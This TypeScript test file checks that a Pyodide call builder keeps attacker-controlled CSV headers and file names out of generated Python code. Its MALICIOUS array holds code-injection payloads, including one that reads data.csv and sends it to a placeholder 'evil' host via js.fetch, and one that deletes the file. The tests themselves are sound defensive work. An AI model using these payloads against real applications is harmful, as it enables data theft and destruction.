import {
  PY_ARGS,
  PyArg,
  PyNamespace,
  PyodideCallRuntime,
  pythonCall,
  runPythonCall,
  runPythonJson,
  unpackZipCall,
} from './pyodide-calls';
import { createSpyObj } from '../../testing/create-spy-obj';

/** Values an attacker controls: CSV header cells and uploaded file names. */
const MALICIOUS = [
  'x"); import js; js.fetch("https://evil/?"+open("data.csv").read())#',
  "x'); import os; os.remove('data.csv')#",
  "x'''); import js#",
  'x"""); import js#',
  'line1\nimport js\njs.fetch("https://evil")',
  'back\\slash\\"); import js#',
  '${fileName}',
];

/** Records how runPythonCall drives the Pyodide API. */
class FakeRuntime implements PyodideCallRuntime {
  readonly namespace: PyNamespace = createSpyObj<PyNamespace>('namespace', ['destroy']);
  readonly converted: Record<string, readonly PyArg[]>[] = [];
  readonly ran: { code: string; globals: PyNamespace }[] = [];

  constructor(private readonly result: () => Promise<unknown>) {}

  toPy(value: Record<string, readonly PyArg[]>): PyNamespace {
    this.converted.push(value);
    return this.namespace;
  }

  runPythonAsync(code: string, options: { globals: PyNamespace }): Promise<unknown> {
    this.ran.push({ code, globals: options.globals });
    return this.result();
  }
}

describe('pythonCall', () => {
  it('never puts argument values into the generated code', () => {
    for (const value of MALICIOUS) {
      const call = pythonCall('preprocessing_processor', 'compute_histogram', [value, value, 50]);

      expect(call.code).not.toContain(value);
      expect(call.code).toBe(`import preprocessing_processor\npreprocessing_processor.compute_histogram(*${PY_ARGS})`);
      expect(call.args).toEqual([value, value, 50]);
    }
  });

  it('passes list arguments through unchanged as data', () => {
    const columns = [...MALICIOUS];
    const call = pythonCall('preprocessing_processor', 'detect_duplicates', ['data.csv', columns]);

    expect(call.args[1]).toBe(columns);
    for (const value of MALICIOUS) {
      expect(call.code).not.toContain(value);
    }
  });

  it('generates the same code whatever the arguments are', () => {
    const plain = pythonCall('processor', 'process_csv_file', ['data.csv']);
    for (const value of MALICIOUS) {
      expect(pythonCall('processor', 'process_csv_file', [value]).code).toBe(plain.code);
    }
  });

  it('rejects module and function names that are not plain identifiers', () => {
    expect(() => pythonCall('os; import js', 'f', [])).toThrowError(/Invalid Python identifier/);
    expect(() => pythonCall('processor', 'f()\nimport js', [])).toThrowError(/Invalid Python identifier/);
    expect(() => pythonCall('processor', '', [])).toThrowError(/Invalid Python identifier/);
  });
});

describe('unpackZipCall', () => {
  it('passes the archive path as data, not as code', () => {
    for (const value of MALICIOUS) {
      const call = unpackZipCall(value);

      expect(call.code).not.toContain(value);
      expect(call.code).toContain(`unpack_flat(*${PY_ARGS})`);
      expect(call.args).toEqual([value]);
    }
  });
});

describe('runPythonCall', () => {
  const call = pythonCall('preprocessing_processor', 'detect_outliers', ['data.csv', MALICIOUS[0], 'iqr_1.5']);

  it('runs the fixed code in a fresh namespace that only holds the arguments', async () => {
    const runtime = new FakeRuntime(() => Promise.resolve('ok'));

    expect(await runPythonCall(runtime, call)).toBe('ok');
    expect(runtime.converted).toEqual([{ [PY_ARGS]: call.args }]);
    expect(runtime.converted[0][PY_ARGS]).toBe(call.args);
    expect(runtime.ran).toEqual([{ code: call.code, globals: runtime.namespace }]);
  });

  it('destroys the namespace after a successful call', async () => {
    const runtime = new FakeRuntime(() => Promise.resolve(undefined));

    await runPythonCall(runtime, call);

    expect(runtime.namespace.destroy).toHaveBeenCalledTimes(1);
  });

  it('destroys the namespace when Python raises', async () => {
    const runtime = new FakeRuntime(() => Promise.reject(new Error('PythonError: boom')));

    await expect(runPythonCall(runtime, call)).rejects.toThrowError('PythonError: boom');
    expect(runtime.namespace.destroy).toHaveBeenCalledTimes(1);
  });
});

describe('runPythonJson', () => {
  const call = pythonCall('preprocessing_processor', 'profile_data', ['data.csv']);

  it('parses the JSON string returned by Python', async () => {
    const runtime = new FakeRuntime(() => Promise.resolve('{"columns": [1, 2]}'));

    expect(await runPythonJson(runtime, call)).toEqual({ columns: [1, 2] });
  });

  it('rejects a result that is not a string', async () => {
    const runtime = new FakeRuntime(() => Promise.resolve(undefined));

    await expect(runPythonJson(runtime, call)).rejects.toThrowError(/Expected a JSON string/);
  });
});
